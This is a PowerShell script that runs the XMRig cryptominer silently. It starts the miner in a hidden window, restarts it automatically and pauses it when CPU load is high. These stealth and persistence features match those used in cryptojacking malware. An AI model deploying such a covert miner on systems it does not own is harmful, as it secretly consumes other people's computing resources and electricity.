# XMRig Silent Wrapper — PowerShell v2
# Do not run this directly. It is launched automatically by xmrig_setup.bat

$exePath    = "C:\Program Files\XMRig\xmrig.exe"
$configPath = "C:\Program Files\XMRig\config.json"
$lockFile   = "C:\ProgramData\XMRig\miner.lock"
$lockDir    = Split-Path $lockFile

# Feature 23: Duplicate instance prevention
# Check if another wrapper is running by checking process list not just lock file
$wrapperCount = (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {
    $_.MainWindowTitle -eq "" 
}).Count

if (Test-Path $lockFile) {
    # Lock file exists — check if xmrig is actually running
    $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($running) {
        # Already running legitimately — exit
        exit 0
    } else {
        # Lock file is stale — delete and continue
        Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    }
}

# Create lock file
if (-not (Test-Path $lockDir)) { New-Item -Path $lockDir -ItemType Directory -Force | Out-Null }
New-Item -Path $lockFile -ItemType File -Force | Out-Null

# Register cleanup on exit — delete lock file when script ends for any reason
$cleanupScript = {
    Remove-Item "C:\ProgramData\XMRig\miner.lock" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
}
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action $cleanupScript | Out-Null

# Feature 17: Self-healing — verify exe exists
if (-not (Test-Path $exePath)) {
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    exit 0
}

# Feature 9: Network check on start — wait up to 60 seconds
$online = $false
for ($i = 0; $i -lt 10; $i++) {
    try {
        Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
        $online = $true
        break
    } catch {
        Start-Sleep -Seconds 6
    }
}
if (-not $online) {
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    exit 0
}

# Feature 6: Launch xmrig completely hidden
$pinfo = New-Object System.Diagnostics.ProcessStartInfo
$pinfo.FileName = $exePath
$pinfo.Arguments = "--config=`"$configPath`" --no-color"
$pinfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$pinfo.CreateNoWindow = $true
$proc = [System.Diagnostics.Process]::Start($pinfo)

# Main monitor loop
while ($true) {
    Start-Sleep -Seconds 30

    # Feature 10+11: Network monitor + auto restart when internet returns
    $online = $false
    try {
        Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
        $online = $true
    } catch {}

    if (-not $online) {
        Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
        while (-not $online) {
            Start-Sleep -Seconds 15
            try {
                Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
                $online = $true
            } catch {}
        }
        $proc = [System.Diagnostics.Process]::Start($pinfo)
    }

    # Feature 13: Back off if system CPU load is high
    try {
        $cpuLoad = (Get-WmiObject -Class Win32_Processor).LoadPercentage
        if ($cpuLoad -gt 80) {
            Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 60
            $proc = [System.Diagnostics.Process]::Start($pinfo)
        }
    } catch {}

    # Feature 14: Crash recovery — restart if xmrig stopped unexpectedly
    $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if (-not $running) {
        Start-Sleep -Seconds 5
        $proc = [System.Diagnostics.Process]::Start($pinfo)
    }
}
